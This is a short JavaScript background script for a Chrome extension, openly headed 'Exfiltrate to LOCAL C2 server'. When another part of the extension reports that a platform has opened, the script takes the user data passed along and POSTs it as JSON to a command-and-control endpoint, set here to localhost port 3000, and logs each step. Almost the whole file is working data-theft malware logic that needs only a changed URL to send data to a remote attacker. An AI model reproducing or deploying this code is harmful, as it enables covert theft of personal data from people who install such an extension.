// ============================================
// BACKGROUND.JS - Exfiltrate to LOCAL C2 server
// ============================================

console.log('✅ Background script loaded!');

const C2_SERVER = 'http://localhost:3000/collect';

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'PLATFORM_OPENED') {
    console.log('🎥 Platform detected');
    console.log('📊 User data received');
    
    exfiltrateToC2(request.userData);
    
    sendResponse({ success: true });
  }
});

function exfiltrateToC2(userData) {
  console.log('📡 EXFILTRATING TO C2 SERVER...');
  console.log('🎯 Target:', C2_SERVER);
  console.log('📦 Data:', userData);
  
  // Send to local C2 server
  fetch(C2_SERVER, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(userData)
  })
  .then(response => response.json())
  .then(data => {
    console.log('✅ Data sent to C2 server!');
    console.log('📨 Response:', data);
  })
  .catch(error => {
    console.log('❌ Error sending to C2:', error);
  });
}

console.log('✅ Background script setup complete');
